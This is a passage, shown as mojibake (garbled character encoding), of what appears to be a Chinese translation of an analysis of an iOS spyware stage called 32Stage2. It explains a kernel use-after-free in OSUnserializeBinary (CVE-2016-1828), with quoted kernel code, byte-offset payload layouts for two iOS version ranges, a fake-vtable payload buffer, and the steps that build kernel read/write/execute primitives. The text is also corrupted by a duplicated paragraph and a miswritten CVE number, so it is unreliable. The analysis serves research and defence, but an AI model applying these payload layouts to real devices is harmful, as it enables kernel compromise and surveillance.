¸ä¸­çš„ä»»æ„ROPé“¾ä»£ç ã€‚ å»ºç«‹å†…æ ¸è¯»/å†™åŸºå…ƒï¼ˆ32ä½ï¼‰åˆ©ç”¨ç°åœ¨å†…æ ¸å†…å­˜ä¸­çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œ32Stage2å¿…é¡»æ¿€æ´»ä»£ç æ‰èƒ½å®‰è£…æ–°çš„clock_opså¤„ç†ç¨‹åºï¼Œè¯¥ç¨‹åºå¯ä½¿ç”¨æˆ·å¯ä»¥è®¿é—®å†…æ ¸å†…å­˜ã€‚32Stage2åœ¨io_service_open_extendedååºåˆ—åŒ–ä¾‹ç¨‹ä¸­ä½¿ç”¨äº†free-after-freeï¼ˆUAFï¼‰æ¼æ´ã€‚è™½ç„¶æŠ¥å‘Šå…ˆå‰å±•ç¤ºäº†io_service_open_extendedçš„ååºåˆ—åŒ–åŠŸèƒ½ä¼šæ³„æ¼å†…æ ¸åœ°å€ä¿¡æ¯ï¼Œä½†åŒä¸€ç»„ä»¶ä¸­çš„å¦ä¸€ä¸ªæ¼æ´ä¹Ÿå¯ä¼šé€ æˆåœ¨å†…æ ¸ä¸­å¯æ‰§è¡Œä»»æ„ä»£ç ã€‚å½“io_service_open_extendedä¼ é€’å±æ€§æ•°æ®blobæ—¶ï¼Œè¯¥å‡½æ•°ä¼šåœ¨å°†ä¿¡æ¯ä¼ é€’ç»™OSUnserializeXMLä¹‹å‰å°†å†…å®¹ä»ç”¨æˆ·ç©ºé—´å¤åˆ¶åˆ°å†…æ ¸ç©ºé—´ã€‚ å¦‚æœkOSSerializeBinarySignatureå€¼å‡ºç°åœ¨æ•°æ®blobçš„å¼€å¤´ï¼ŒOSUnserializeXMLæŒ‰é¡ºåºå°†ä¿¡æ¯ä¼ é€’ç»™OSUnserializeBinaryã€‚OSUnserializeBinaryå­˜åœ¨è¿™ä¸ªæ¼æ´ã€‚ propertieså‚æ•°ä¸­çš„æ•°æ®blobè¡¨ç¤ºä¸€å·²åºåˆ—åŒ–çš„XMLå­—å…¸ï¼ˆæˆ–å®¹å™¨ï¼‰ã€‚ä¸ºäº†é‡æ„å…³ç³»ï¼ŒOSUnserializeBinaryéå†æ•´ä¸ªblobæ•°æ®æ¥è§£æå‡ºå„ä¸ªæ•°æ®å¯¹è±¡ã€‚åœ¨ç¼–ç è¿‡ç¨‹ä¸­ï¼ˆå°†åŸå§‹XMLè½¬æ¢ä¸ºå…¶äºŒè¿›åˆ¶è¡¨ç¤ºçš„è¿‡ç¨‹ï¼‰å¯èƒ½ä¼šé‡å¤å‘ç°ç›¸åŒçš„å¯¹è±¡ã€‚ä¸ºäº†æ›´æœ‰æ•ˆåœ°å¤„ç†é‡å¤æ•°æ®ï¼Œå°†é‡å¤å¯¹è±¡å­˜å‚¨åœ¨æ•°ç»„ï¼ˆobjsArrayï¼‰ä¸­ï¼Œé‡æ„çš„XMLå­—å…¸ä¸­çš„å¯¹è±¡å°±å¯ä»¥ç”±æ•°ç»„çš„ç´¢å¼•æ¥è¡¨ç¤ºã€‚ åœ¨OSUnserializeBinaryä¸­ï¼Œwhileå¾ªç¯éå†blobä¸­çš„æ¯ä¸ªå·²ç¼–ç å¯¹è±¡ã€‚å¾ªç¯é¦–å…ˆç¡®å®šå¯¹è±¡çš„ç±»å‹ï¼ˆä¾‹å¦‚ï¼ŒkOS Serialize Dictionaryï¼ŒkOS SerializeArrayï¼ŒkOSSerializeNumberï¼Œç­‰ç­‰ï¼‰åŠå…¶å¤§å°ã€‚ len = (key &amp; kOSSerializeDataMask); ... switch ( kOSSerializeTypeMask &amp; key) { case kOSSerializeDictionary: o = newDict = OSDictionary::withCapacity(len); newCollect = (len!=0); break; case kOSSerializeArray: o = newArray =OSArray::withCapacity(len); newCollect = (len!=0); break; case kOSSerializeSet: o = newSet = OSSet::withCapacity(len); newCollect = (len!=0); case kOSSerializeObject; if(len&gt;=objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; } switchè¯­å¥è°ƒåº¦é€‚å½“çš„æŒ‡ä»¤æ¥å¤„ç†æ•°æ®blobä¸­æ‰¾åˆ°çš„æ¯ç§ç±»å‹çš„å¯¹è±¡ã€‚è¿™äº›æŒ‡ä»¤ä¼šç”Ÿæˆæ–°å¯¹è±¡ï¼Œå¹¶æ ¹æ®ç‰¹å®šå¯¹è±¡åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰€éœ€çš„å†…å®¹è®¾ç½®ä¸å¯¹è±¡ç›¸å…³çš„æ ‡å¿—ã€‚kOSSerializeObjectå¯¹è±¡ç±»å‹æ˜¯ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œè¡¨ç¤ºå·²ç»ååºåˆ—åŒ–çš„å¯¹è±¡ï¼Œå› æ­¤ï¼Œå°†æ ‡å¿—isRefè®¾ç½®ä¸ºtrueï¼Œè¡¨ç¤ºè¯¥å¯¹è±¡æ˜¯å¯¹objsArrayæ•°ç»„ä¸­å·²æœ‰å¯¹è±¡çš„å¼•ç”¨ã€‚å¦‚æœisRefå€¼æœªè®¾ç½®ä¸ºtrueï¼Œåˆ™åˆšåˆšè¿›è¡Œååºåˆ—åŒ–çš„å½“å‰å¯¹è±¡å°†é€šè¿‡setAtIndexæ·»åŠ åˆ°objsArrayï¼š switchè¯­å¥è°ƒåº¦é€‚å½“çš„æŒ‡ä»¤æ¥å¤„ç†æ•°æ®blobä¸­æ‰¾åˆ°çš„æ¯ç§ç±»å‹çš„å¯¹è±¡ã€‚è¿™äº›æŒ‡ä»¤ä¼šç”Ÿæˆæ–°å¯¹è±¡ï¼Œå¹¶æ ¹æ®ç‰¹å®šå¯¹è±¡åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰€éœ€çš„å†…å®¹è®¾ç½®ä¸å¯¹è±¡ç›¸å…³çš„æ ‡å¿—ã€‚kOSSerializeObjectå¯¹è±¡ç±»å‹æ˜¯ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œè¡¨ç¤ºå·²ç»ååºåˆ—åŒ–çš„å¯¹è±¡ï¼Œå› æ­¤ï¼Œå°†æ ‡å¿—isRefè®¾ç½®ä¸ºtrueï¼Œè¡¨ç¤ºè¯¥å¯¹è±¡æ˜¯å¯¹objsArrayæ•°ç»„ä¸­å·²æœ‰å¯¹è±¡çš„å¼•ç”¨ã€‚å¦‚æœisRefå€¼æœªè®¾ç½®ä¸ºtrueï¼Œåˆ™åˆšåˆšè¿›è¡Œååºåˆ—åŒ–çš„å½“å‰å¯¹è±¡å°†é€šè¿‡setAtIndexæ·»åŠ åˆ°objsArrayï¼š if (! isRef) { setAtIndex (objs, objsIdx, o); if ( !ok) break; objsIdx++; } setAtIndexæ˜¯ä¸€ä¸ªå®ï¼Œå°†å¯¹è±¡ï¼ˆoï¼‰æ·»åŠ åˆ°objsArrayã€‚è™½ç„¶iOSç¯å¢ƒä¸­å­˜åœ¨æ›´å¼ºå¤§çš„æ•°ç»„å¯¹è±¡ï¼Œä¾‹å¦‚OSArrayï¼ˆä¼šè‡ªåŠ¨å¤„ç†å¼•ç”¨è®¡æ•°çš„æ•°ç»„å®¹å™¨ï¼‰ï¼Œä½†OSUnserializeBinaryå¯¹å…¶å·²ååºåˆ—åŒ–çš„å¯¹è±¡çš„æ•°ç»„å¯¹è±¡ç®¡ç†é‡‡ç”¨æ‰‹åŠ¨å¤šä¸€äº›çš„ç®¡ç†æ–¹å¼ã€‚ååºåˆ—åŒ–åï¼Œé€šè¿‡è°ƒç”¨o-&gt; releaseï¼ˆï¼‰æ¥å°†å¯¹è±¡çš„å¼•ç”¨è®¡æ•°æ¸…é›¶ï¼Œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹å°†å¯¼è‡´å¯¹è±¡è¢«é‡Šæ”¾ã€‚å¯èƒ½ä¼šåœ¨kOSSerializeObjectå¯¹è±¡ä¸­æŠ›å‡ºå¼‚å¸¸ã€‚ ç”±äºkOSSerializeObjectå¯¹è±¡æ˜¯ä¸€ä¸ªè¡¨ç¤ºè¢«å…¶ä»–æ¡ç›®å¼•ç”¨çš„å¯¹è±¡ï¼Œå› æ­¤å¿…é¡»åœ¨åºåˆ—åŒ–åä¿ç•™è¯¥å¯¹è±¡ã€‚å› æ­¤ï¼Œåœ¨ååºåˆ—åŒ–æœŸé—´ï¼ŒkOSSerializeObjectå¯¹è±¡å°†è°ƒç”¨o-&gt; retainï¼ˆï¼‰ï¼Œä»è€Œå¢åŠ å¯¹è±¡çš„å¼•ç”¨è®¡æ•°å¹¶é˜²æ­¢ä»å†…å­˜ä¸­åˆ é™¤å®ƒã€‚ åºåˆ—åŒ–æ•°æ®blobå…è®¸å¤šæ¬¡ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ã€‚ æ¢å¥è¯è¯´ï¼Œæœ‰å¯èƒ½ï¼ˆç›´åˆ°iOS 9.3.1ï¼Œåœ¨CVE-2016-1828ä¸­ä¿®å¤äº†é‡å¤å¯†é’¥é—®é¢˜ï¼‰ä½¿XMLä»£ç å¦‚ä¸‹ï¼š &lt;dict&gt; &lt;key&gt;KEY1&lt;/key&gt; &lt;number&gt;1&lt;/number&gt; &lt;key&gt;KEY1&lt;/key&gt; &lt;string&gt;2&lt;/string&gt; &lt;/dict&gt; ä¸Šé¢çš„XMLä¸€æ—¦åºåˆ—åŒ–ï¼Œå°†åŒ…å«äº”ä¸ªå¯¹è±¡ã€‚ç¬¬ä¸€ä¸ªå¯¹è±¡æ˜¯å­—å…¸å®¹å™¨ï¼ˆ&lt;dict&gt;è¡¨ç¤ºkOSSerializeDictionaryå¯¹è±¡ï¼‰ï¼Œåè·Ÿè¡¨ç¤ºé”®çš„ç¬¦å·ï¼ˆâ€œKEY1â€èµ‹ç»™kOSSerializeSymbolï¼‰åŠå…¶æ•°æ®å¯¹è±¡ï¼ˆæ•´æ•°1èµ‹ç»™kOSSerializeNumberï¼‰ã€‚ç¬¬å››ä¸ªå±æ€§æŒ‡å®šå¦ä¸€ä¸ªå¯†é’¥å¯¹è±¡ï¼Œä¼šå†æ¬¡åˆ†é…ç»™KEY1ï¼Œç°åœ¨è¿™ä¸ªå±æ€§æ˜¯ä¸€ä¸ªåŒ…å«å­—ç¬¦ä¸²â€œ2â€çš„å­—ç¬¦ä¸²å¯¹è±¡ï¼ˆkOSSerializeStringï¼‰ã€‚ä½œä¸ºååºåˆ—åŒ–è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ï¼ŒKEY1çš„é‡ç”¨å¯¼è‡´æ¥ä¸‹æ¥çš„å¯¹è±¡ä¼šæ›¿æ¢åˆ†é…ç»™KEY1çš„åŸå§‹å€¼ã€‚ç”¨æ–°æ•°æ®æ›¿æ¢å¯†é’¥ä¾¿æ˜¯OSUnserializeBinaryå®¹æ˜“å—åˆ°æ”»å‡»çš„åœ°æ–¹ã€‚ å¦‚å‰æ‰€è¿°ï¼Œå½“å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶ï¼Œåªè¦è¯¥å¯¹è±¡ä¸æ˜¯kOSSerializeObjectï¼Œè¯¥å¯¹è±¡å°±å­˜å‚¨åœ¨objsArrayä¸­ä»¥ä¾›ä¹‹åå¼•ç”¨ã€‚æ­¤å­˜å‚¨æ˜¯setAtIndexå®çš„ç»“æœï¼Œå¦‚ä¸‹ï¼š #define setAtIndex(v, idx, o) \\ if (idx &gt;= v##Capacity) \\ { \\ unint32_t ncap = v##Capacity+64; \\ typeof(v##Array)nbuf = (typeof (v##Array)) kalloc_container(ncap*sizeof(o)); \\ if (!nbuf) ok =false; \\ if(v##Array) \\ { \\ bcopy(v##Array, nbuf, v##Capacity * sizeof(o)); \\ kfree(v##Array,v##Capacity * sizeof(o)); \\ } \\ v##Array=nbuf; \\ v##Capacity=ncap; \\ } \\ if (ok) v##Array[idx]=o; å®å°†æ‰©å±•objsArrayä»¥å®¹çº³é™„åŠ å¯¹è±¡ï¼Œå¹¶å°†å¯¹è±¡åˆ†é…åˆ°objsArrayçš„æœ«å°¾ï¼Œè€Œä¸é€šè¿‡o-&gt; retainï¼ˆï¼‰è°ƒç”¨å¢åŠ å…¶å¼•ç”¨è®¡æ•°ã€‚æ­¤æ–¹æ³•çš„é—®é¢˜åœ¨äºï¼Œå½“ç¬¬äºŒä¸ªå¯¹è±¡æ›¿æ¢ç°æœ‰å¯¹è±¡æ—¶ï¼ˆåœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œå°±æ˜¯æ¯å½“å­—ç¬¦ä¸²å¯¹è±¡æ›¿æ¢KEY1çš„æ•°å­—å¯¹è±¡æ—¶ï¼‰ï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡è¢«é‡Šæ”¾å¹¶éšåè¢«é‡Šæ”¾ï¼Œä½†æ˜¯æŒ‡å‘ç°åœ¨é‡Šæ”¾çš„å¯¹è±¡çš„æŒ‡é’ˆå­˜åœ¨äºobjsArrayä¸­ã€‚é€šå¸¸è¿™åªæ˜¯ä¸€ä¸ªç³Ÿç³•çš„ç¼–ç¨‹è®¾è®¡é—®é¢˜ï¼Œä½†å¦‚æœé€šè¿‡kOSSerializeObjectæ¡ç›®å¼•ç”¨è¯¥å¯¹è±¡ï¼Œåˆ™é—®é¢˜ä¼šå˜å¾—æ›´åŠ å¤æ‚ã€‚å¦‚æœkOSSerializeObjectæ¡ç›®é€šè¿‡ç´¢å¼•å¼•ç”¨å·²é‡Šæ”¾å¯¹è±¡çš„æŒ‡é’ˆï¼Œåˆ™å¯¹o-&gt; retainï¼ˆï¼‰çš„è°ƒç”¨å°†å°è¯•æ‰§è¡Œå—æ”»å‡»è€…æ§åˆ¶çš„è™šå‡½æ•°ã€‚ ä¸ºäº†åˆ©ç”¨UAFæ¼æ´ï¼Œ32Stage2å¿…é¡»æ§åˆ¶å·²è§£é™¤åˆ†é…çš„å†…å­˜ä½ç½®ï¼Œå¹¶æ”¾ç½®ä¸€ä¸ªè‡ªå®šä¹‰vtableï¼Œå®ƒå°†ä½¿retainæ¡ç›®æŒ‡å‘è‡ªå·±é€‰æ‹©çš„å‡½æ•°ã€‚å®‰è£…è‡ªå®šä¹‰vtableéœ€è¦è®¿é—®ä¸¤ä¸ªå·²é‡Šæ”¾çš„ç›¸é‚»å†…å­˜ä½ç½®ã€‚ç”±äºåœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­æ— æ³•ç›´æ¥è¦†ç›–å¯¹è±¡çš„vtableï¼Œé€šè¿‡åˆ†é…ç„¶åé‡Šæ”¾ä¸¤ä¸ªå†…å­˜ä½ç½®ï¼Œ32Stage2å¯ä»¥ä½¿ç”¨OSDataæˆ–OSStringå¯¹è±¡ä¸€æ¬¡æ›¿æ¢ä¸¤ä¸ªå†…å­˜ä½ç½®ï¼Œå…¶ä¸­ä¸€ä¸ªå†…å­˜ä½ç½®åŒ…å«æ¶æ„vtableã€‚å¯¼è‡´UAFæ¼æ´çš„ä¸Šè¿°æ¡ä»¶æ˜¯CVE-2016-18284çš„ç»“æœï¼Œå¹¶ä¸”å­˜åœ¨äº9.0åˆ°9.3.1çš„iOSç‰ˆæœ¬ä¸­ã€‚32Stage2é€šè¿‡ä½¿ç”¨ä»¥ä¸‹payloadæ¥åˆ©ç”¨æ­¤æ¼æ´ï¼Œä»¥ä¾¿åœ¨iOSæ—¶é’Ÿå¤„ç†ç¨‹åºä¸­å®‰è£…å†…æ ¸è¯»/å†™åŸè¯­ã€‚ [0x00] kOSSerailizeBinarySignature [0x04] kOSSerailizeEndCollecton | kOSSerailizeDictionary | 0x10 [0x08] kOSSerailizeString | 4 [0x0C] &quot;sy2&quot; [0x10] kOSSerailizeEndCollecton | kOSSerailizeArray | 0x10 [0x14] kOSSerailizeDictionary | 0x10 [0x18] kOSSerailizeSymbol | 4 [0x1C] &quot;sy1&quot; [0x20] kOSSerailizeData | 0x14 [0x24] &quot;ffff\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&quot; [0x38] kOSSerailizeSymbol | 4 [0x3C] &quot;sy1&quot; [0x40] kOSSerailizeEndCollecton | kOSSerailizeSymbol | 4 [0x44] &quot;sy1&quot; [0x48] kOSSerailizeString | 0x1C [0x4C] {payload buffer} [0x68] kOSSerailizeString | 0x1C [0x6C] {payload buffer} [0x88] kOSSerailizeString | 0x1C [0x8C] {payload buffer} [0xA8] kOSSerailizeEndCollecton | kOSSerailizeObject | 5 åœ¨payloadä¸­ï¼Œ32Stage2é‡ç”¨sy1å¯†é’¥ä»¥é€šè¿‡UAFæ¼æ´æ¿€æ´»payloadã€‚ ä»iOSç‰ˆæœ¬9.3.2å¼€å§‹ï¼Œä¿®è¡¥äº†CVE-2016-1828æ¼æ´ï¼Œè¿™è¿«ä½¿éœ€è¦ä¸€ç§ä¸åŒçš„æœºåˆ¶æ¥å®‰è£…å†…æ ¸è¯»/å†™åŸè¯­ã€‚ä½†æ˜¯ï¼ŒOSUnserializeBinaryçš„kOSSerializeObjectä»åŒ…å«UAFæ¼æ´ã€‚ ç†è§£è¿™ä¸ªæ¦‚å¿µçš„æœ€ç®€å•æ–¹æ³•æ˜¯æŸ¥çœ‹32Stage2ç”Ÿæˆçš„payloadï¼Œä»¥åˆ©ç”¨OSUnserializeBinary UAFæ¼æ´ã€‚ å¯¹äºiOSç‰ˆæœ¬9.3.2è‡³å°‘9.3.3ï¼Œpayloadé‡‡ç”¨ä»¥ä¸‹å½¢å¼ï¼š [0x00] kOSSerailizeBinarySignature [0x04] kOSSerailizeEndCollecton | kOSSerailizeDictionary | 0x10 [0x08] kOSSerializeString | 4 [0x0C] &quot;sy2&quot; [0x10] kOSSerializeData | 0x14 [0x14] {payload buffer} [0x28] kOSSerializeEndCollecton | kOSSerializeObject | 1 è™½ç„¶åœ¨ç»“æ„ä¸Šå®ƒä»¬çœ‹èµ·æ¥æœ‰äº›ä¸åŒï¼Œä½†æœ€ç»ˆå®ƒä»¬éƒ½åˆ©ç”¨äº†UAFæ¼æ´ã€‚åœ¨iOS 9.3.2åŠæ›´é«˜ç‰ˆæœ¬ä¸­ä½¿ç”¨çš„è¿™ç§æ›´ç®€å•çš„payloadæ˜¯æœ€å®¹æ˜“ç†è§£çš„ã€‚å½“OSUnserializeBinaryå¼€å§‹ååºåˆ—åŒ–payloadçš„è§£æè¿‡ç¨‹æ—¶ï¼Œè¯¥å‡½æ•°å°†åˆ›å»ºä¸€ä¸ªæ–°çš„å­—å…¸å¯¹è±¡ï¼Œåç§»0x04å¤„çš„è¿è¡Œç»“æœã€‚åœ¨è¯å…¸ä¸­æœ‰ä¸¤ä¸ªæ— é”®å¯¹è±¡ã€‚ç¬¬ä¸€ä¸ªå¯¹è±¡æ˜¯ä¸€ä¸ªOSStringå¯¹è±¡ï¼Œå…¶å€¼ä¸ºsy2ï¼ˆåˆ†åˆ«åœ¨åç§»é‡0x08å’Œ0x0Cä¸­æŒ‡å®šï¼‰ã€‚åœ¨åç§»é‡0x10å¤„æŒ‡å®šå¤§å°ä¸º0x14ï¼ˆ20ï¼‰å­—èŠ‚çš„OSDataå¯¹è±¡ã€‚OSDataå¯¹è±¡åŒ…å«payloadç¼“å†²åŒºæ•°æ®ç»“æ„ã€‚ç”±äºå¯¹è±¡æ˜¯æ— é”®çš„ï¼ŒOSUnserializeBinaryå°†ç”¨OSDataå¯¹è±¡æ›¿æ¢OSStringå¯¹è±¡ï¼Œä½†å°†æŒ‡é’ˆç•™åœ¨objsArrayä¸­ã€‚ç”±äºOSStringå¯¹è±¡æ²¡æœ‰retainï¼ˆï¼‰è°ƒç”¨ï¼ŒOSStringè¢«é‡Šæ”¾ï¼Œä»è€Œå°†ä¸¤ä¸ªå†…å­˜æ•°ç»„æ”¾å…¥ç©ºé—²åˆ—è¡¨ä¸­ï¼ˆä¸€ä¸ªç”¨äºOSStringå¯¹è±¡æœ¬èº«ï¼Œå¦ä¸€ä¸ªç”¨äºä¸OSStringå¯¹è±¡å…³è”çš„å­—ç¬¦ä¸²ï¼‰ã€‚ å½“OSUnserializeBinaryè§£ækOSSerializeDataæ—¶ï¼Œå°†åˆ†é…æ–°çš„OSDataå¯¹è±¡ï¼Œä»è€Œä»ç©ºé—²åˆ—è¡¨ä¸­æ¶ˆè€—ä¸€ä¸ªå·²é‡Šæ”¾çš„å†…å­˜ä½ç½®ã€‚å½“ä¸kOSSerializeDataå…³è”çš„æ•°æ®è¢«å¤åˆ¶åˆ°OSDataå¯¹è±¡ä¸­æ—¶ï¼Œå°†ä¸ºæ•°æ®åˆ†é…æ–°çš„ç¼“å†²åŒºï¼Œè¯¥ç¼“å†²åŒºå°†æ¶ˆè€—ç©ºé—²åˆ—è¡¨ä¸­çš„å‰©ä½™æ•°æ®ä½ç½®ã€‚æ­¤æ—¶ï¼ŒobjsArrayä¸­çš„æ‚¬ç©ºæŒ‡é’ˆå·²è¢«OSDataå¯¹è±¡çš„æ•°æ®æ›¿æ¢ã€‚å®ƒæ˜¯ä¸OSDataå¯¹è±¡å…³è”çš„æ•°æ®ï¼Œå…¶ä¸­åŒ…å«æ¶æ„payloadï¼Œæœ€ç»ˆå°†ç»™äºˆ32Stage2å†™è®¿é—®å†…æ ¸æƒé™ï¼Œä»¥ä¾¿å®‰è£…è¯»/å†™åŸè¯­ã€‚ æ— è®ºiOSç‰ˆæœ¬å¦‚ä½•ï¼Œæ¶æ„payloadéƒ½åŒ…å«ç›¸åŒçš„payloadç¼“å†²åŒºã€‚payloadç¼“å†²åŒºæ˜¯ä¸€ä¸ª20å­—èŠ‚çš„ç»“æ„ï¼Œç”±ä»¥ä¸‹å…ƒç´ ç»„æˆï¼š [00] address of uaf_payload_buffer + 8 [04] {uninitialized data from stack} [08] address of uaf_payload_buffer [0C] static value of 20 [10] address of OSSerializer::serialize payloadå¿…é¡»åŒ…å«æŒ‡å‘åç§»é‡0x10å¤„æ–°ä¿ç•™å‡½æ•°çš„æŒ‡é’ˆã€‚32Stage2ä½¿ç”¨OSSerializer :: serializeå‡½æ•°ä½œä¸ºæ›¿æ¢ä¿ç•™ã€‚è¿™ç§è®¾è®¡æ„å‘³ç€payloadçš„å…¶ä½™éƒ¨åˆ†å¿…é¡»æ¨¡æ‹ŸOSSerializerå¯¹è±¡çš„vtableã€‚å¦‚å…ˆå‰åœ¨å·²æ¤å…¥çš„è®¾å¤‡ä¸Šå»ºç«‹è¯»/å†™/æ‰§è¡ŒåŸè¯­æ‰€è¿°ï¼ŒOSSerializer :: serializeå‡½æ•°å°†åœ¨æ‰€æä¾›çš„vtableçš„åç§»0x10å¤„è°ƒç”¨è¯¥å‡½æ•°ï¼ŒåŒæ—¶å°†vtableçš„åç§»0x08å’Œ0x0Cä¼ é€’ç»™è¢«è°ƒç”¨çš„å‡½æ•°ã€‚å‡è®¾åç§»é‡0x10è®¾ç½®ä¸ºOSSerializer :: serializeï¼Œåˆ™ä¼šå†æ¬¡è°ƒç”¨è¯¥å‡½æ•°ï¼Œä½†ç¬¬äºŒæ¬¡å°†è°ƒç”¨åç§»é‡0x08æŒ‡å®šçš„vtableã€‚æ­¤è°ƒç”¨ä¼šå¯¼è‡´ä¸€ç³»åˆ—åç»­è°ƒç”¨ï¼Œæœ€ç»ˆå¯¼è‡´è°ƒç”¨ _copyinï¼Œè¿™ä¸ªå‡½æ•°æ›¿æ¢å®æ—¶å’Œç”µæ± æ—¶é’Ÿçš„getattrå¤„ç†ç¨‹åºï¼Œæ­£å¦‚åœ¨ä¹‹å‰æ¤å…¥çš„è®¾å¤‡ä¸Šå»ºç«‹è¯»/å†™/æ‰§è¡ŒåŸè¯­æ­¥éª¤ä¸­æ‰€è¿°ã€‚ åœ¨æ‰§è¡Œæ¼æ´åˆ©ç”¨ä¹‹åï¼Œå¦‚æœå—å®³è€…çš„æ‰‹æœºæ˜¯â€œiPhone4,1â€ï¼Œåˆ™æ§åˆ¶ä¹‹å‰ç”Ÿæˆçš„1000ä¸ªçº¿ç¨‹çš„å…¨å±€å˜é‡å€¼å°†è®¾ç½®ä¸º-1ä»¥ç»ˆæ­¢çº¿ç¨‹ã€‚ ä¸ºéªŒè¯ç”µæ± æ—¶é’Ÿçš„getattrå¤„ç†ç¨‹åºæ˜¯å¦æˆåŠŸè¯»å–å†…æ ¸å†…å­˜åœ°å€ï¼Œå°†è°ƒç”¨clock_get _attributesï¼Œå¹¶å°†è¯»å–ä½ç½®æŒ‡å®šä¸ºå†…æ ¸çš„åŸºå€ã€‚å¦‚æœclock_get _attributesçš„ç»“æœä¸æ˜¯é­”æœ¯å€¼0xFEEDFACEï¼Œåˆ™å†æ¬¡å°è¯•ã€‚ ç¬¬äºŒæ¬¡å¤±è´¥å¯¼è‡´è°ƒç”¨assertå›è°ƒå¹¶ç»ˆæ­¢32Stage2ã€‚ å»ºç«‹å†…æ ¸è¯»/å†™åŸºå…ƒï¼ˆ64ä½ï¼‰åœ¨ç¬¬äºŒé˜¶æ®µçš„64ä½ç‰ˆæœ¬ä¸­åˆ©ç”¨äº†ç›¸åŒçš„åº•å±‚æ¼æ´ã€‚åŸåˆ™ä¸Šï¼Œæ¼æ´åˆ©ç”¨çš„ç»“æ„éå¸¸ç±»ä¼¼ã€‚ä¸»è¦åŒºåˆ«åœ¨äºé€šè¿‡å†™å…¥net.inet.ip.dummynet.extract _ heap sysctlå¤„ç†ç¨‹åºæ¥å»ºç«‹æœ€ç»ˆçš„æ‰§è¡ŒåŸè¯­ã€‚OSSerializer :: serializeçš„ä½¿ç”¨æ–¹å¼ä¸32Stage2ä¸­çš„ç±»ä¼¼ã€‚ç„¶åä½¿ç”¨åœ¨å»ºç«‹å†…æ ¸æ‰§è¡ŒåŸè¯­ï¼ˆ32ä½ï¼‰ä¸­æè¿°çš„ç›¸åŒæœºåˆ¶æ¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œï¼ˆé€šè¿‡æ‰§è¡Œä»»æ„ROPé“¾ï¼‰ã€‚ å»ºç«‹å†…æ ¸æ‰§è¡ŒåŸè¯­ï¼ˆ32ä½ï¼‰æ­£å¦‚ä¹‹å‰åœ¨Rooted Devicesä¸Šå®‰è£…å†…æ ¸è®¿é—®å¤„ç†ç¨‹åºä¸­æ‰€è§£é‡Šçš„é‚£æ ·ï¼Œå®æ—¶æ—¶é’Ÿçš„getattrå¤„ç†ç¨‹åºæŒ‡å‘OSSerializer :: serializeï¼Œå®ƒå…è®¸clock_get_attributesçš„è°ƒç”¨è€…å°†ç‰¹åˆ¶ç»“æ„ä¼ é€’ç»™OSSerializer :: serializeä»¥ä¾¿åœ¨å†…æ ¸ç©ºé—´ä¸­æ‰§è¡ŒæŒ‡ä»¤ã€‚è¦åœ¨å†…æ ¸ç©ºé—´å†…æ‰§è¡Œï¼Œç”¨æˆ·åŒº32Stage2è¿›ç¨‹å¿…é¡»å…·æœ‰ä»¥å¯é çš„æ–¹å¼å°†æ•°æ®ä¼ è¾“åˆ°å†…æ ¸åœ°å€ç©ºé—´çš„æ–¹æ³•ã€‚ 32Stage2ä½¿ç”¨ç®¡é“åˆ›å»ºçš„ç®¡é“é›†çš„æ–¹æ³•æ¥å®Œæˆæ­¤ä»»åŠ¡ã€‚ åœ¨å°†ç”µæ± æ—¶é’Ÿçš„æ–°getattrå¤„ç†ç¨‹åºå»ºç«‹ä¸º _bufattr _cpx ä¹‹åï¼Œ32Stage2æœ‰ä¸€ä¸ªå¯é çš„æ–¹æ³•å°†DWORDä»å†…æ ¸åœ°å€ç©ºé—´è¯»å…¥ç”¨æˆ·ç©ºé—´ã€‚32Stage2ä½¿ç”¨æ­¤åŠŸèƒ½æ¥æŸ¥æ‰¾å­˜å‚¨åœ¨å†…æ ¸ä¸­çš„addrpermå€¼ã€‚addrpermé‡æ–°å®šä¹‰æ•°æ®ä¼ å…¥ç”¨æˆ·åŒºæ—¶åœ¨å†…æ ¸ä¸­çš„åç§»é‡ï¼Œä»¥ä¾¿æ··æ·†å†…æ ¸ä¸­æ•°æ®çš„çœŸå®ä½ç½®ã€‚å¦‚æœè·å¾—è¯¥å€¼ï¼Œå¯ä»¥å°†å†…æ ¸åœ°å€åæ··æ·†åˆ°å…¶çœŸå®åœ°å€å€¼ã€‚32Stage2ä»ç”Ÿæˆçš„ç®¡é“é›†ä¸­è°ƒç”¨è¯»å–ç®¡é“çš„fstatï¼Œç„¶åè®¡ç®—statç»“æ„çš„ä½ç½®ä¸å†…æ ¸åœ°å€ç©ºé—´ä¹‹é—´çš„å·®å¼‚ã€‚ç„¶åå°†è¯¥å€¼å­˜å‚¨åœ¨å…¨å±€å˜é‡ä¸­ï¼Œä¾›å¿…é¡»è®¿é—®å†…æ ¸å†…å­˜ä»¥æ‰§è¡Œä»£ç çš„å‡½æ•°ä½¿ç”¨ã€‚ æ¯å½“32Stage2æƒ³è¦åœ¨å†…æ ¸ä¸­æ‰§è¡Œä»£ç æ—¶ï¼Œä»¥ä¸‹æ•°æ®ç»“æ„å°†å†™å…¥ç”Ÿæˆçš„ç®¡é“é›†ä¸­write pipeï¼š [00] argument 1 [04] argument 2 [08] address of cpde execute ä¸ºäº†è°ƒç”¨æ•°æ®åç§»é‡8ä¸­æŒ‡å®šçš„å‡½æ•°ï¼Œå¦ä¸€ä¸ªDWORDè¢«é¢„å…ˆæ·»åŠ åˆ°æ•°æ®ä¸­å¹¶ä¼ é€’ç»™å®æ—¶æ—¶é’Ÿçš„getattrå¤„ç†ç¨‹åºï¼ˆé€šè¿‡OSSerializer :: 